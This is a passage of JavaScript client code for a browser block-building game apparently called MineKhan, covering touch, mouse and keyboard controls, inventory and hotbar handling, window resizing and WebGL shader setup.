		for(let i=0;i<pvPackets.length;i+=4){
			let x = pvPackets[i+2]
			pvRows[x] = max(pvRows[x], pvPackets[i].length*8-pvPackets[i+1])
		}
		let x = pvRows.indexOf(min(...pvRows))

		pvPackets.push(arr,0,x,fromClient) //array of bits, index, x, fromClient
		pvSize += arr.length
	}
	win.packetViewerAdd = packetViewerAdd
	function packetViewerAddJSON(o, arr, fromClient = false){
		let str = JSON.stringify(o)
		packetViewerJSON.appendChild(doc.createElement("br"))
		let span = doc.createElement("span")
		span.textContent = str
		span.style.color = fromClient ? "lightblue" : "lime"
		packetViewerJSON.appendChild(span)
		while(packetViewerJSON.clientHeight - packetViewerJSON.firstChild.offsetHeight > packetViewerContainer.clientHeight){
			packetViewerJSON.firstChild.remove()
		}
		pvSize += arr.length
	}
	win.packetViewerAddJSON = packetViewerAddJSON*/

	let unpauseDelay = 0, mmoveX = 0, mmoveY = 0
	function mmoved(e) {
		let mouseS = settings.mouseSense / 30000
		mmoveX -= e.movementY * mouseS
		mmoveY += e.movementX * mouseS
    //more stuff in controls
	}
	function trackMouse(e, mouseNotMoved) {
    var redraw = false
		if (screen !== "play") {
			cursor("")
			if(!mouseNotMoved){
				mouseX = e.x
				mouseY = e.y
			}
      if((screen !== "main menu" || performFast) && !autoDrawScreens.includes(screen) && changeSceneAnimation === null){
				hoverbox.classList.add("hidden")
        drawScreens[screen]()
        redraw = true
      }
			if(!mouseNotMoved) Slider.drag(e)
		}
    if(screen === "inventory" || screen === "crafting" || screen === "furnace" || screen === "chest" || screen === "anvil" || screen === "dispenser" || screen === "hopper"){
			hoverbox.classList.add("hidden")
      moveInv()
      redraw = true
    }
    if(redraw){
      Button.draw()
      Slider.draw()
    }
	}
	document.onmousemove = trackMouse
  
  //added by me from mobile test minekhan with more code
	//https://www.khanacademy.org/computer-programming/mobile-test-minekhan/5100360783052800
	let pTouch = {x: -100, y: 0, joystickX:0,joystickY:0};
	let worldTouch = null //the touch that breaks and places stuff
  let currentTouches = []
  win.currentTouches = currentTouches
  function copyTouch({ identifier, pageX, pageY }) {
    return { identifier, pageX, pageY };
  }
  let touchMoveLimit = 500 //(touch screen only) miliseconds before it decides you want to break a block
	canvas.addEventListener("touchstart", function(e) {
		for(let touch of e.changedTouches){
			e.tOuCH = copyTouch(touch)
			e.x = touch.pageX;
			e.y = touch.pageY;
			e.tOucHScrEeN = true
			currentTouches.push(e.tOuCH)
			keydown(e)
			let over = Button.mouseIsOver(true)
			mouseDown = true
			touchScreen = true
			if(screen === "play" && !over) {
				if(changeSlot()){
					pTouch.onHotbar = e.tOuCH
				}else{
					pTouch.canDig = true
					pTouch.x = e.x
					pTouch.y = e.y
					worldTouch = e.tOuCH
					pTouch.touching = true
					pTouch.touchStart = Date.now()
					pTouch.moved = false
				}
			}
		}
    e.preventDefault();
	}, false);
	canvas.addEventListener("touchmove", function(e) {
		for(let ti=0; ti<e.changedTouches.length; ti++){
			for(let i=0; i<currentTouches.length; i++){
				if(currentTouches[i].identifier === e.changedTouches[ti].identifier){
					let t = currentTouches[i]
					t.pageX = e.changedTouches[ti].pageX
					t.pageY = e.changedTouches[ti].pageY
					e.tOuCH = t
					break
				}
			}
			let touch = e.tOuCH
			if(!touch) continue
			e.movementY = touch.pageY - pTouch.y;
			e.movementX = touch.pageX - pTouch.x;
			e.x = touch.pageX
			e.y = touch.pageY
			let isWorldTouch = worldTouch && touch.identifier === worldTouch.identifier
			if(isWorldTouch){
				pTouch.x = e.x
				pTouch.y = e.y
			}
			e.tOucHScrEeN = true
			if(screen === "play" && isWorldTouch){
				mmoved(e);
				pTouch.moved = true
				if(Date.now() - pTouch.touchStart < touchMoveLimit && (e.movementX > 2 || e.movementY > 2 || e.movementX < -2 || e.movementY < -2)){
					pTouch.canDig = false
				}
			}else{
				trackMouse(e)
			}
		}
    e.preventDefault();
	}, false);
  const touchend = e => {
		for(let touch of e.changedTouches){
			let id = touch.identifier
			for(let i=0; i<currentTouches.length; i++){
				if(currentTouches[i].identifier === id){
					e.tOuCH = currentTouches[i]
					currentTouches.splice(i,1)
					break
				}
			}
			e.tOucHScrEeN = true
			keyup(e)
			if(screen === "play" && Date.now() - pTouch.touchStart < touchMoveLimit && pTouch.canDig){
				if(entHitbox.ent){
					breakKeyPressed()
				}else{
					placeKeyPressed()
				}
			}else if(screen === "play" && pTouch.canDig && entHitbox.ent){
				placeKeyPressed()
			}
			let isWorldTouch = worldTouch && id === worldTouch.identifier
			if(isWorldTouch){
				pTouch.touching = pTouch.canDig = false
				worldTouch = null
			}
			if(pTouch.onHotbar && id === pTouch.onHotbar.identifier){
				pTouch.onHotbar = false
			}
			if(!currentTouches.length){
				mouseDown = false
			}
		}
    e.preventDefault();
  }
	canvas.addEventListener("touchend",touchend,false)
  canvas.addEventListener("touchcancel",touchend,false)
  let changeSlot = () => {
    let y = height - inventory.size
		y -= inventory.size/2
    for(let i = 0; i < 9; i ++) {
      let x = width / 2 - 9 / 2 * inventory.size + (i + 0.5) * inventory.size + 25
		  x -= inventory.size/2
			if((mouseX>x)&&(mouseY>y)&&(mouseX < x+inventory.size)&&(mouseY < y+inventory.size)){
			  inventory.hotbarSlot = i
				send({type:"hotbar",slot:inventory.hotbarSlot})
        inventory.showName = 3
			  updateHUD = true
        return true
			}
		}
    
    i = 9
    let x = width / 2 - 9 / 2 * inventory.size + (i + 0.5) * inventory.size + 25
    x -= inventory.size/2
    if((mouseX>x)&&(mouseY>y)&&(mouseX < x+inventory.size)&&(mouseY < y+inventory.size)){
      changeScene("inventory")
      return true
    }
    i = -1
    x = width / 2 - 9 / 2 * inventory.size + (i + 0.5) * inventory.size + 25
    x -= inventory.size/2
    if((mouseX>x)&&(mouseY>y)&&(mouseX < x+inventory.size)&&(mouseY < y+inventory.size)){
      cycleBlockShapes()
      return true
    }
  }
  
	document.onpointerlockchange = function() {
		if (doc.pointerLockElement === canvas) {
			doc.onmousemove = mmoved
		} else {
			doc.onmousemove = trackMouse
			if (screen === "play" && !freezeFrame) {
				changeScene("pause")
				unpauseDelay = Date.now() + 1000
			}
		}
		for (let key in Key) {
			Key[key] = false
		}
	}
  let breakKeyPressed = () => {
		p.punchEffect = 10
    if(entHitbox.ent){
      entClick()
    }else{
      if(p.survival){
				crack.soundTimer = 5
				if(hitBox.pos) send({type:"startBreak",x:hitBox.pos[0],y:hitBox.pos[1],z:hitBox.pos[2]})
			}else changeWorldBlock()
      p.lastStartBreak = performance.now()
    }
		if(!p.spectator && (entHitbox.ent || !hitBox.pos)){
			let pitch = rand(0.5,0.8)
			playSound("shoot",0,1,pitch)
      send({type:"playSound", data:"shoot", x:p.x,y:p.y,z:p.z, pitch:pitch})
		}
  }
  let placeKeyPressed = () => {
		p.punchEffect = 10
    if(entHitbox.ent){
      entInteract()
    }else{
      p.spyglassStart = Date.now()
      if(holding) newWorldBlock()
    }
  }
	function toggleView(){
		if(!p.thirdPerson){
			p.thirdPerson = true
		}else if(p.thirdPerson === "front"){
			p.thirdPerson = false
		}else{
			p.thirdPerson = "front"
		}
	}
  function keydown(e){
		if(e instanceof MouseEvent && touchScreen) return
    let k, redraw = false
    if(e.type === "keydown"){
      k = e.key.toLowerCase()
      if (e.preventDefault && k === " ") {
        e.preventDefault()
      }
      if (e.repeat || Key[k]) {
        return
      }
      if(screen === "play") Key[k] = true
      touchScreen = false
			if(screen === "inventory" && k !== "escape") invTextbox.focus()
    }else if(e.type === "mousedown" || e.type === "touchstart"){
      mouseX = e.x
      mouseY = e.y
      mouseDown = true
			if(screen === "play"){
				switch(e.button) {
					case 0:
						k = "leftMouse"
						Key.leftMouse = true
						break
					case 1:
						k = "middleMouse"
						Key.middleMouse = true
						break
					case 2:
						k = "rightMouse"
						Key.rightMouse = true
						break
				}
			}
      if(screen === "play" && doc.pointerLockElement !== canvas && !touchScreen){
				getPointer()
				p.lastBreak = Date.now()
        return
			}
      if (screen === "inventory" || screen === "crafting" || screen === "furnace" || screen === "chest" || screen === "anvil" || screen === "dispenser" || screen === "hopper") {
        /*if(mouseDown && mouseX >= width-barW){
          draggingInvBar = true
          invBarOffset = mouseY-map(invScroll, 0, invHeight, (barH/2), height-(barH/2))
        }*/
        if(screen === "crafting")clickCrafting(e.button)
        else if(screen === "furnace")clickFurnace(e.button)
        else if(screen === "chest") clickChest(e.button)
        else if(screen === "anvil")clickAnvil(e.button)
        else if(screen === "dispenser") clickDispenser(e.button)
        else if(screen === "hopper") clickHopper(e.button)
        else clickInv(false, e.button)
        redraw = true
      }
    }else if(e.type === "controlName"){
			k = controlMap[e.key].key
			Key[k] = true
		}
		if(screen === "play") {
      place = false
      if(k === controlMap.break.key) {
        if(Key.control) {
          place = true
        }else	breakKeyPressed()
      }
      if(k === controlMap.place.key) {
        place = true
      }
      if(k === controlMap.pick.key && hitBox.pos && !p.survival){
        let block, index
        updateHUD = true
        block = world.getBlock(hitBox.pos[0], hitBox.pos[1], hitBox.pos[2], p.dimension) & 0x3ff
        index = -1
        for(var i=0; i<9; i++){
					let item = inventory.slots[inventory.slotIds.hotbar[i]]
          if(item && item.id === block){
            index = i
            break
          }
        }
        if (index >= 0) {
          inventory.hotbarSlot = index
					send({type:"hotbar",slot:index})
        } else {
          inventory.slots[inventory.slotIds.hotbar[inventory.hotbarSlot]] = {id:block, amount:1}
					send({type:"containerChange",data:[inventory.slots[inventory.slotIds.hotbar[inventory.hotbarSlot]]],idxs:[inventory.slotIds.hotbar[inventory.hotbarSlot]]})
        }
        inventory.showName = 3
        inventory.slots[inventory.slotIds.hotbar[inventory.hotbarSlot]].animation = 1.5
      }
      if(place) {
        placeKeyPressed()
      }

      if (k === controlMap.cycleBlockShapes.key) {
        cycleBlockShapes()
      }

			if(k === controlMap.pause.key) {
				releasePointer()
				changeScene("pause")
			}

			if(k === controlMap.superBreaker.key) {
				p.autoBreak = !p.autoBreak
				updateHUD = true
        if(p.survival) p.autoBreak = false
			}
      if(k === controlMap.hyperBuilder.key) {
				p.autoBuild = !p.autoBuild
				updateHUD = true
        if(p.survival) p.autoBuild = false
			}

			if (k === controlMap.jump.key && !p.spectator) {
				if (Date.now() < p.lastJump + 400) {
					if(!p.survival) p.flying ^= true
				} else {
					p.lastJump = Date.now()
				}
			}
      if(k === controlMap.forward.key){
        if (Date.now() < p.lastForward + 400 && !p.sprinting && !p.sneaking) {
          p.sprinting = true
          p.camera.FOV(settings.fov + 10, 125)
        } else {
          p.lastForward = Date.now()
        }
      }

			if (k === controlMap.zoom.key) {
				p.camera.FOV(10, 300)
			}

			if (k === controlMap.sneak.key && !p.flying) {
				p.sneaking = true
        p.sitting = false
				p.riding = null
				if (p.sprinting) {
					p.camera.FOV(settings.fov, 100)
				}
				p.sprinting = false
				p.speed = p.sneakSpeed
				//p.bottomH = p.sneakBottomH
        //p.y -= 0.3
			}

			if (k === controlMap.spectator.key) {
				/*p.gameMode = p.spectator ? "creative" : "spectator"
				p.flying = true
				p.onGround = false
				p.riding = null
        if(p.spectator){
          p.spectating = entHitbox.ent
        }else if(p.spectating){
					p.spectating = null
					p.spectateRemoteControl = false
					pSetScale(1)
					p.gameMode = "spectator"
				}
				updateHUD = true*/
				send({type:"gameMode",gameMode: (p.spectator && !p.spectating) ? "creative" : "spectator"})
			}
      if (k === controlMap.toggleView.key){
        toggleView()
      }
			if(k === controlMap.sit.key){
				p.sitting = !p.sitting
			}

			if (k === controlMap.inventory.key) {
				changeScene("inventory")
				releasePointer()
			}

			if (k === ";") {
				releasePointer()
				freezeFrame = true
			}
      
      if(k === controlMap.chat.key){
        Messages.showInput()
        e.preventDefault()
      }
      if(k === controlMap.command.key){
        Messages.showInput("/")
        e.preventDefault()
      }

			if (k === controlMap.dropItem.key && inventory.slots[inventory.slotIds.hotbar[inventory.hotbarSlot]]) {
				if(world.isMK){
					/*let d = p.direction
	        let block = holding || inventory.hotbar[inventory.hotbarSlot].id
	        block = block < isCube && !blockData[block].item ? block | blockMode : block
					world.addItems(p.x, p.y, p.z, p.dimension, d.x/4, d.y/4, d.z/4, block, false, 1,inventory.hotbar[inventory.hotbarSlot].durability,inventory.hotbar[inventory.hotbarSlot].customName,p.id)
	        if(p.survival){
	          inventory.hotbar[inventory.hotbarSlot].amount --
	          inventory.hotbar[inventory.hotbarSlot].animation = 1.5
	          updateHUD = true
	        }*/
					let item = inventory.slots[inventory.slotIds.hotbar[inventory.hotbarSlot]]
					item.amount--
					if(!item.amount) item = inventory.slots[inventory.slotIds.hotbar[inventory.hotbarSlot]] = null
					send({type:"containerChange",data:[item],idxs:[inventory.slotIds.hotbar[inventory.hotbarSlot]]})
					if(item) item.animation = 1.5
					updateHUD = true
					p.punchEffect = 10
				}else{
					send({type:"dropItem"})
				}
			}

			if(Number(k)) {
				inventory.hotbarSlot = Number(k) - 1
				send({type:"hotbar",slot:inventory.hotbarSlot})
        inventory.showName = 3
				updateHUD = true
			}
			
			if(Key.control){
				if(k === "s"){
					e.preventDefault()
					lastAutosave = now
					autosaveTimer = now
					saving = true
					if(host) serverWorld.sendAll({type:"saveProg",data:"start"})
				}
			}
			if (k === "f3") {
				if(showDebug === -1) showDebug = 1
				else showDebug = (showDebug + 1) % 3
				updateHUD = true
			}
			if(k === "f4"){
				disableLighting = !disableLighting
			}
			if(k === "+") fasterVel *= 2
			if(k === "-") fasterVel = 1

			if(p.spectateRemoteControl && controlKeys[k] && controlKeys[k].isGameControl) send({type:"controlName",event:"keydown",key:controlKeys[k].name},p.spectating.id)
		} else if (screen === "pause") {
			if(k === controlMap.pause.key) {
				play()
			}
		} else if (screen === "inventory" || screen === "crafting" || screen === "furnace" || screen === "chest" || screen === "anvil" || screen === "dispenser" || screen === "hopper") {
			if (k === controlMap.inventory.key) {
				play()
			}
			if (k === controlMap.cycleBlockShapes.key) {
				drawScreens.inventory()
			}
		}else if(screen === "chat"){
      if(k === controlMap.chat.key){
        play()
      }
    }
    
    if(e.type === "mousedown" || e.type === "touchstart"){
      Button.click(e)
      Slider.click(e)
      if(redraw){
        Button.draw()
        Slider.draw()
      }
    }
  }
  function keyup(e){
    let k
    if(e.type === "keyup"){
      k = e.key.toLowerCase()
		  Key[k] = false
    }else if(e.type === "mouseup" || e.type === "touchend" || e.type === "touchcancel"){
      switch(e.button) {
        case 0:
          Key.leftMouse = false
          k = "leftMouse"
          break
        case 1:
          Key.middleMouse = false
          k = "middleMouse"
          break
        case 2:
          Key.rightMouse = false
          k = "rightMouse"
          break
      }
      mouseDown = false
      Button.mouseup(e)
      Slider.release(e)
      //draggingInvBar = false
      if(screen === "inventory" || screen === "crafting" || screen === "furnace" || screen === "chest" || screen === "anvil" || screen === "dispenser" || screen === "hopper") releaseInv()
    }else if(e.type === "controlName"){
			k = controlMap[e.key].key
			Key[k] = false
		}
    
    if(screen === "play"){
      if((k === controlMap.place.key || e.type === "touchend" || e.type === "touchcancel") && blockData[holding] && blockData[holding].onrelease){
        //var pos = hitBox.pos, x = pos && pos[0], y = pos && pos[1], z = pos && pos[2]
        //if(p.survival && blockData[holding].minusOnUse){inventory.hotbar[inventory.hotbarSlot].amount --; updateHUD = true}
        //if(!blockData[holding].onrelease(x,y,z, p.dimension, inventory.hotbar[inventory.hotbarSlot])){p.lastPlace = Date.now(); return}

				if(!world.isMK) send({type:"stopPlace"})
      }

			if (k === controlMap.zoom.key) {
				p.camera.FOV(settings.fov, 300)
			}

			if (k === controlMap.sneak.key && p.sneaking) {
				p.sneaking = false
				p.speed = p.defaultSpeed
				//p.bottomH = p.defaultBottomH
				// p.y += 0.3
			}
			if(p.spectateRemoteControl && controlKeys[k] && controlKeys[k].isGameControl) send({type:"remoteControl",event:"keyup",key:controlKeys[k].name},p.spectating.id)
    }
    
    if(k === "escape" && (screen === "pause" || screen === "inventory" || screen === "chest" || screen === "furnace" || screen === "anvil" || screen === "dispenser" || screen === "hopper" || screen === "chat" || screen === "custom menu" || screen === "options" && previousScreen === "pause") && Date.now() > unpauseDelay) {
			play()
		}
  }
  canvas.onmousedown = canvas.onkeydown = keydown
  canvas.onmouseup = canvas.onkeyup = keyup
	canvas.onblur = function() {
		for (let key in Key) {
			Key[key] = false
		}
		/*mouseDown = false
		Slider.release()*/
	}
	canvas.oncontextmenu = function(e) {
		e.preventDefault()
	}
	window.onbeforeunload = e => { 
		if (screen === "play" && Key.control) {
			releasePointer()
			e.preventDefault()
			e.returnValue = "Q is the sprint button; Ctrl + W closes the page."
			return true
		}
	}
	canvas.onwheel = e => {
		e.preventDefault()
		e.stopPropagation()
    var redraw = false
    if(screen === "play"){
      if (e.deltaY > 0) {
        inventory.hotbarSlot++
      } else if (e.deltaY < 0) {
        inventory.hotbarSlot--
      }
      if (inventory.hotbarSlot > 8) {
        inventory.hotbarSlot = 0
      } else if (inventory.hotbarSlot < 0) {
        inventory.hotbarSlot = 8
      }
			send({type:"hotbar",slot:inventory.hotbarSlot})
      inventory.showName = 3
      updateHUD = true
    }
    /*if(screen === "inventory" || screen === "crafting" || screen === "furnace" || screen === "chest" || screen === "anvil" || screen === "dispenser" || screen === "hopper"){
      invScroll += e.deltaY
      if(invScroll < 0) invScroll = 0
      if(invScroll > invHeight) invScroll = invHeight
      drawScreens[screen]()
      redraw = true
    }*/
    if(redraw){
      Button.draw()
      Slider.draw()
    }
	}
	document.onwheel = e => {} // Shouldn't do anything, but it helps with a Khan Academy bug somewhat
	window.onresize = async e => {
		if(!everythingInited) return //if not initialized yet
		width = window.innerWidth
		height = window.innerHeight
		resolution = settings.resolution === "max" ? devicePixelRatio : (settings.resolution === "low" ? 0.125 : 1)
		resWidth = width*resolution
		resHeight = height*resolution //resolution of display
		canvas.height = resHeight
		canvas.width = resWidth
		ctx.resetTransform()
		ctx.scale(resolution,resolution)
    canvas2.width = resWidth
    canvas2.height = resHeight
		gl.canvas.width = resWidth
		gl.canvas.height = resHeight
		gl.canvas.style.width = width+"px"
		gl.canvas.style.height = height+"px"
		gl.viewport(0, 0, resWidth, resHeight)
    //gl.uniform2f(glCache.screenSize,width,height)
		inventory.size = 40 * min(width, height) / 600
    inventory.ts = inventory.size / 16
		updateHUDIcons()
		initButtons()
		initAvgBrightnessProgram()
		p.camera.FOV(p.currentFov + 0.0001)

		if(html[screen] && html[screen].onresize){
			html[screen].onresize()
		}
		if (screen === "play") {
			play()
		} else {
			drawScreens[screen]()
			Button.draw()
			Slider.draw()
		}
		await initBackgrounds()
		use3d()
	}

	let removePixelRatioChange;
	const updatePixelRatio = () => {
		if (removePixelRatioChange) {
			removePixelRatioChange()
		}
		const media = matchMedia(`(resolution: ${window.devicePixelRatio}dppx)`);
		media.addEventListener("change", onresize);
		removePixelRatioChange = () => {
			media.removeEventListener("change", onresize);
		};
	};
	updatePixelRatio();

	function use2d() {
		gl.disableVertexAttribArray(glCache.aTexture)
		gl.disableVertexAttribArray(glCache.aShadow)
		gl.disableVertexAttribArray(glCache.aVertex)
		gl.disableVertexAttribArray(glCache.aSkylight)
		gl.disableVertexAttribArray(glCache.aBlocklight)
		gl.useProgram(program2D)
		
		gl.enableVertexAttribArray(glCache.aVertex2)
		gl.enableVertexAttribArray(glCache.aTexture2)
		gl.enableVertexAttribArray(glCache.aShadow2)
	}
	function use3d() {
		gl.disableVertexAttribArray(glCache.aTexture2)
		gl.disableVertexAttribArray(glCache.aShadow2)
		gl.disableVertexAttribArray(glCache.aVertex2)
		gl.useProgram(program3D)
		
		gl.enableVertexAttribArray(glCache.aVertex)
		gl.enableVertexAttribArray(glCache.aTexture)
		gl.enableVertexAttribArray(glCache.aShadow)
		gl.enableVertexAttribArray(glCache.aSkylight)
		gl.enableVertexAttribArray(glCache.aBlocklight)
	}

	let maxLoad = 1
	function startLoad() {
		// Runs when the loading screen is opened; cache the player's position
		/*p2.x = p.x
		p2.y = p.y
		p2.z = p.z*/
    maxLoad = 9
	}
	function initAvgBrightnessProgram(){
		updateAvgBrightnessBuffer = true
		win.programAvgBrightness = programAvgBrightness = createProgram("avgBrightness",{WIDTH:gl.canvas.width+".",HEIGHT:gl.canvas.height+".",AREA:gl.canvas.width*gl.canvas.height+".",WIDTHI:gl.canvas.width,HEIGHTI:gl.canvas.height})
		gl.useProgram(programAvgBrightness)
		glCache.aPositionAvgBrightness = gl.getAttribLocation(programAvgBrightness, "position")
		glCache.texAvgBrightness = gl.getUniformLocation(programAvgBrightness, "tex")
		glCache.texSizeAvgBrightness = gl.getUniformLocation(programAvgBrightness, "texSizeAvgBrightness")
		gl.enableVertexAttribArray(glCache.aPositionAvgBrightness)
	}
  function initWebglPrograms(){
    modelView = new Float32Array(16)
		glCache = {}
		win.glCache = glCache
		if(program3D){
			gl.deleteProgram(program3D)
			gl.deleteProgram(program2D)
			gl.deleteProgram(skyboxProgram)
			gl.deleteProgram(programEntity)
			gl.deleteProgram(programParticle)
			gl.deleteProgram(programText)
			gl.deleteProgram(programWeather)
		}
		if(programShadowMap) gl.deleteProgram(programShadowMap)
		win.program3D = program3D = createProgram("block")
		win.program2D = program2D = createProgram("2d")
    win.skyboxProgram = skyboxProgram = createProgram("skybox")
		win.programEntity = programEntity = createProgram("entity")
    win.programParticle = programParticle = createProgram("particle")
    win.programText = programText = createProgram("text")
		win.programWeather = programWeather = createProgram("weather")
		if(settings.graphics === "morereal") win.programShadowMap = programShadowMap = createProgram("shadowMap")
		
		gl.useProgram(program2D)
		glCache.uSampler2 = gl.getUniformLocation(program2D, "uSampler")
		glCache.aTexture2 = gl.getAttribLocation(program2D, "aTexture")
		glCache.aVertex2 = gl.getAttribLocation(program2D, "aVertex")
		glCache.aShadow2 = gl.getAttribLocation(program2D, "aShadow")
    
    gl.useProgram(skyboxProgram)
    glCache.skyboxVertex = gl.getAttribLocation(skyboxProgram, "aVertex");
    glCache.skyboxLight = gl.getUniformLocation(skyboxProgram, "light");
    glCache.skyboxView = gl.getUniformLocation(skyboxProgram, "uView");
    glCache.skyboxSky = gl.getUniformLocation(skyboxProgram, "sky");
    glCache.skyboxSkyBottom = gl.getUniformLocation(skyboxProgram, "skyBottom");
    glCache.skyboxTime = gl.getUniformLocation(skyboxProgram, "uTime")
    glCache.skyboxBrightness = gl.getUniformLocation(skyboxProgram, "brightness")

		gl.useProgram(programEntity)
		glCache.uSamplerEntity = gl.getUniformLocation(programEntity, "uSampler")
		glCache.uBlockLightEntity = gl.getUniformLocation(programEntity, "uBlockLight")
		glCache.uSkylightEntity = gl.getUniformLocation(programEntity, "uSkylight")
		glCache.uTimeEntity = gl.getUniformLocation(programEntity, "uTime")
		glCache.uViewEntity = gl.getUniformLocation(programEntity, "uView")
		glCache.uModelMatEntity = gl.getUniformLocation(programEntity, "uModelMat")
		glCache.skyColorEntity = gl.getUniformLocation(programEntity, "skyColor")
		glCache.flickerEntity = gl.getUniformLocation(programEntity, "flicker")
    glCache.harmEffectEntity = gl.getUniformLocation(programEntity, "harmEffect")
		glCache.aTextureEntity = gl.getAttribLocation(programEntity, "aTexture")
		glCache.aVertexEntity = gl.getAttribLocation(programEntity, "aVertex")
		glCache.aNormalEntity = gl.getAttribLocation(programEntity, "aNormal")
    glCache.tintEntity = gl.getUniformLocation(programEntity, "tint")
    glCache.tintGrayEntity = gl.getUniformLocation(programEntity, "tintGray")
    glCache.shaderEntity = gl.getUniformLocation(programEntity, "shader")
    glCache.brightnessEntity = gl.getUniformLocation(programEntity, "brightness")
		glCache.useNormalsEntity = gl.getUniformLocation(programEntity, "useNormals")
		glCache.uLanternEntity = gl.getUniformLocation(programEntity, "uLantern")
		glCache.uGameTimeEntity = gl.getUniformLocation(programEntity, "uGameTime")
    glCache.inLiquidEntity = gl.getUniformLocation(programEntity, "inLiquid")
		glCache.uDistEntity = gl.getUniformLocation(programEntity, "uDist")
		glCache.uPosEntity = gl.getUniformLocation(programEntity, "uPos")
		glCache.fogTimeEntity = gl.getUniformLocation(programEntity, "fogTime")
		glCache.lightMethodEntity = gl.getUniformLocation(programEntity, "lightMethod")
		if(settings.graphics === "morereal"){
			glCache.shadowMapSamplersEntity = gl.getUniformLocation(programEntity, "shadowMapSamplers")
			glCache.skylightView0Entity = gl.getUniformLocation(programEntity, "skylightView[0]")
			glCache.skylightView1Entity = gl.getUniformLocation(programEntity, "skylightView[1]")
			glCache.skylightView2Entity = gl.getUniformLocation(programEntity, "skylightView[2]")
			glCache.skylightDirEntity = gl.getUniformLocation(programEntity, "skylightDir")
			glCache.skylightAmountEntity = gl.getUniformLocation(programEntity, "skylightAmount")
			glCache.skyOrangeEntity = gl.getUniformLocation(programEntity, "skyOrange")
			gl.uniform1iv(glCache.shadowMapSamplersEntity, [11,12,13])
		}
		gl.disableVertexAttribArray(glCache.aNormalEntity)
		gl.vertexAttrib3f(glCache.aNormalEntity, 0,1,0)
    gl.uniform1i(glCache.flickerEntity, 0)
    gl.uniform3f(glCache.tintEntity, 1,1,1)
    gl.uniform1i(glCache.tintGrayEntity, 0)
    gl.uniform1i(glCache.shaderEntity, 0)
    gl.uniform1i(glCache.useNormalsEntity, 0)
		gl.uniform1i(glCache.lightMethodEntity, 0)
    
    gl.useProgram(programParticle)
		glCache.uSamplerParticle = gl.getUniformLocation(programParticle, "uSampler")
		glCache.uBlockLightParticle = gl.getUniformLocation(programParticle, "uBlockLight")
		glCache.uSkylightParticle = gl.getUniformLocation(programParticle, "uSkylight")
		glCache.uTimeParticle = gl.getUniformLocation(programParticle, "uTime")
		glCache.uViewParticle = gl.getUniformLocation(programParticle, "uView")
		glCache.skyColorParticle = gl.getUniformLocation(programParticle, "skyColor")
		glCache.flickerParticle = gl.getUniformLocation(programParticle, "flicker")
		glCache.uViewParticle = gl.getUniformLocation(programParticle, "uView")
		glCache.aTextureParticle = gl.getAttribLocation(programParticle, "aTexture")
		glCache.aVertexParticle = gl.getAttribLocation(programParticle, "aVertex")
    glCache.tintParticle = gl.getUniformLocation(programParticle, "tint")
    glCache.tintGrayParticle = gl.getUniformLocation(programParticle, "tintGray")
    glCache.brightnessParticle = gl.getUniformLocation(programParticle, "brightness")
		glCache.uLanternParticle = gl.getUniformLocation(programParticle, "uLantern")
    glCache.inLiquidParticle = gl.getUniformLocation(programParticle, "inLiquid")
		glCache.uDistParticle = gl.getUniformLocation(programParticle, "uDist")
		glCache.uPosParticle = gl.getUniformLocation(programParticle, "uPos")
		glCache.fogTimeParticle = gl.getUniformLocation(programParticle, "fogTime")
		glCache.lightMethodParticle = gl.getUniformLocation(programParticle, "lightMethod")
		glCache.uModelMatParticle = gl.getUniformLocation(programParticle, "uModelMat")
		if(settings.graphics === "morereal"){
			glCache.shadowMapSamplersParticle = gl.getUniformLocation(programParticle, "shadowMapSamplers")
			glCache.skylightView0Particle = gl.getUniformLocation(programParticle, "skylightView[0]")
			glCache.skylightView1Particle = gl.getUniformLocation(programParticle, "skylightView[1]")
			glCache.skylightView2Particle = gl.getUniformLocation(programParticle, "skylightView[2]")
			glCache.skylightDirParticle = gl.getUniformLocation(programParticle, "skylightDir")
			glCache.skylightAmountParticle = gl.getUniformLocation(programParticle, "skylightAmount")
			glCache.skyOrangeParticle = gl.getUniformLocation(programParticle, "skyOrange")
			gl.uniform1iv(glCache.shadowMapSamplersParticle, [11,12,13])
		}
    gl.uniform1i(glCache.flickerParticle, 0)
    gl.uniform3f(glCache.tintParticle, 1,1,1)
    gl.uniform1i(glCache.tintGrayParticle, 0)
		gl.uniform1i(glCache.lightMethodParticle, 0)
    
    gl.useProgram(programText)
    glCache.aVertexText = gl.getAttribLocation(programText, "aVertex")
    glCache.aTextureText = gl.getAttribLocation(programText, "aTexture")
    glCache.aColorText = gl.getAttribLocation(programText, "aTextColor")
    glCache.aColorSetText = gl.getAttribLocation(programText, "aColorSet")
		glCache.uSamplerText = gl.getUniformLocation(programText, "uSampler")
		glCache.uLightLevelText = gl.getUniformLocation(programText, "uLightLevel")
		glCache.uViewText = gl.getUniformLocation(programText, "uView")
    glCache.colorText = gl.getUniformLocation(programText, "textColor")
    glCache.backgroundText = gl.getUniformLocation(programText, "background")
    glCache.glowText = gl.getUniformLocation(programText, "glow")
    glCache.brightnessText = gl.getUniformLocation(programText, "brightness")
		glCache.uLanternText = gl.getUniformLocation(programText, "uLantern")

		gl.useProgram(programWeather)
		glCache.aVertexWeather = gl.getAttribLocation(programWeather, "aVertex")
    glCache.aTextureWeather = gl.getAttribLocation(programWeather, "aTexture")
    glCache.typeWeather = gl.getAttribLocation(programWeather, "type")
		glCache.uSamplerWeather = gl.getUniformLocation(programWeather, "uSampler")
		glCache.uLightLevelWeather = gl.getUniformLocation(programWeather, "uLightLevel")
		glCache.uViewWeather = gl.getUniformLocation(programWeather, "uView")
    glCache.uGameTimeWeather = gl.getUniformLocation(programWeather, "uGameTime")
    glCache.uAmountWeather = gl.getUniformLocation(programWeather, "uAmount")
    glCache.brightnessWeather = gl.getUniformLocation(programWeather, "brightness")
    glCache.uDistWeather = gl.getUniformLocation(programWeather, "uDist")
    glCache.uPosWeather = gl.getUniformLocation(programWeather, "uPos")
		gl.uniform1f(glCache.uDistWeather,weatherRenderDist)

		if(settings.graphics === "morereal"){
			gl.useProgram(programShadowMap)
			glCache.aVertexShadowMap = gl.getAttribLocation(programShadowMap, "aVertex")
			glCache.aTextureShadowMap = gl.getAttribLocation(programShadowMap, "aTexture")
			glCache.skylightViewShadowMap = gl.getUniformLocation(programShadowMap, "skylightView")
			glCache.uSamplerShadowMap = gl.getUniformLocation(programShadowMap, "uSampler")
		}

		gl.useProgram(program3D)
		glCache.uSampler = gl.getUniformLocation(program3D, "uSampler")
		glCache.uPos = gl.getUniformLocation(program3D, "uPos")
		glCache.uDist = gl.getUniformLocation(program3D, "uDist")
		glCache.uTime = gl.getUniformLocation(program3D, "uTime")
    glCache.uGameTime = gl.getUniformLocation(program3D, "uGameTime")
